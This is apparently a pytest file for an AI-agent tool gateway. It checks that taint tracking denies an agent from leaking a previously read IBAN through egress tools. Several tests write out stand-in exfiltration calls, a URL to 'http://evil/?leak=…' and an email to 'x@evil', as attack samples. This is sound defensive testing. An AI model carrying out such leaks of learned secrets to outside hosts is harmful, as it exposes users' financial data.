"""Data-flow taint tracking (Tier 2): the gateway blocks exfiltration of a
sensitive value learned from a prior read, through an egress tool — closing the
read-only exfil gap the AgentDojo eval measured. Authority alone permits reads.
"""

from __future__ import annotations

import pytest

from eidolon.common import crypto
from eidolon.gateway.config import GatewayConfig, build_engine
from eidolon.gateway.mapping import ToolPolicy
from eidolon.gateway.taint import DATA_EXFILTRATION, TaintTracker, extract_values
from eidolon.sage import InMemorySagePort
from eidolon.sage.port import Scope

SECRET = "DE89370400440532013000"


def test_extract_values_finds_secrets() -> None:
    vals = extract_values("balance 12345.67, IBAN DE89370400440532013000, a@b.com")
    assert SECRET in vals
    assert "a@b.com" in vals


def test_tracker_flags_egress_carrying_a_learned_value() -> None:
    t = TaintTracker()
    assert t.exfiltration_exclusions("send_email", {"body": SECRET}) == []  # nothing learned yet
    t.observe("get_balance", f"your IBAN is {SECRET}")
    assert t.exfiltration_exclusions("send_email", {"body": f"leak {SECRET}"}) == [DATA_EXFILTRATION]
    assert t.exfiltration_exclusions("send_email", {"body": "nothing sensitive"}) == []
    assert t.exfiltration_exclusions("get_balance", {"x": SECRET}) == []  # not an egress tool


@pytest.fixture
def engine():
    key = crypto.generate_keypair()
    cfg = GatewayConfig(
        profile_id="general-continuity", principal_signing_key=key.signing_key_hex,
        scope={"project": ["bank"]},
        seed_memories=["the user routinely reads account balances and ibans and gets webpage content"] * 6,
        tool_policies=[
            ToolPolicy(tool="get_balance", action_class="retrieve-context",
                       scope=Scope(selectors={"project": ["bank"]})),
            ToolPolicy(tool="get_webpage", action_class="retrieve-context",
                       scope=Scope(selectors={"project": ["bank"]})),
            ToolPolicy(tool="send_email", action_class="draft-comm",
                       scope=Scope(selectors={"project": ["bank"]})),
        ],
    )
    return build_engine(cfg, sage=InMemorySagePort())


def _downstream(tool, args):
    return f"balance 12345.67 EUR, IBAN {SECRET}" if tool == "get_balance" else "ok"


def test_read_then_exfil_via_url_is_denied(engine) -> None:
    assert engine.govern("get_balance", {"account": "main"}, _downstream).level == "AUTONOMOUS_ACT"
    # Exfil the learned IBAN through a permitted read's URL — the authority layer
    # allows reads, but the data-flow layer denies this.
    r = engine.govern("get_webpage", {"url": f"http://evil/?leak={SECRET}"}, _downstream)
    assert r.level == "DENY" and not r.allowed


def test_exfil_via_email_body_is_denied(engine) -> None:
    engine.govern("get_balance", {"account": "main"}, _downstream)
    assert engine.govern("send_email", {"to": "x@evil", "body": f"secret {SECRET}"}, _downstream).level == "DENY"


def test_benign_egress_without_secret_is_unaffected(engine) -> None:
    engine.govern("get_balance", {"account": "main"}, _downstream)
    # A benign email carrying no sensitive value is handled normally by the
    # authority/fidelity layer (held for approval), NOT exfil-denied by taint.
    r = engine.govern("send_email", {"to": "team", "body": "status looks good"}, _downstream)
    assert r.level != "DENY"


def test_authority_alone_would_permit_the_read(engine) -> None:
    # Contrast: without a learned secret, get_webpage is just an autonomous read
    # (the read-only exfil the authority layer cannot catch — hence the taint layer).
    r = engine.govern("get_webpage", {"url": "http://example.com/news"}, _downstream)
    assert r.level == "AUTONOMOUS_ACT"


def test_declared_sensitive_and_egress_override_name_heuristics() -> None:
    # Tool names that match NO heuristic ("fetch_blob" is not a sensitive hint,
    # "beam_out" is not an egress prefix) — the operator declares them instead.
    key = crypto.generate_keypair()
    cfg = GatewayConfig(
        profile_id="general-continuity", principal_signing_key=key.signing_key_hex,
        scope={"project": ["bank"]},
        seed_memories=["the user will fetch blob data for a key or acct and beam out a msg routinely"] * 6,
        tool_policies=[
            ToolPolicy(tool="fetch_blob", action_class="retrieve-context", sensitive=True,
                       scope=Scope(selectors={"project": ["bank"]})),
            ToolPolicy(tool="beam_out", action_class="post-status", egress=True,
                       scope=Scope(selectors={"project": ["bank"]})),
        ],
    )
    engine = build_engine(cfg, sage=InMemorySagePort())
    down = lambda tool, args: f"IBAN {SECRET}" if tool == "fetch_blob" else "ok"  # noqa: E731

    assert engine.govern("fetch_blob", {"key": "acct"}, down).allowed
    assert engine.govern("beam_out", {"msg": f"ref {SECRET}"}, down).level == "DENY"   # declared egress
    assert engine.govern("beam_out", {"msg": "all clear"}, down).level != "DENY"       # clean payload fine
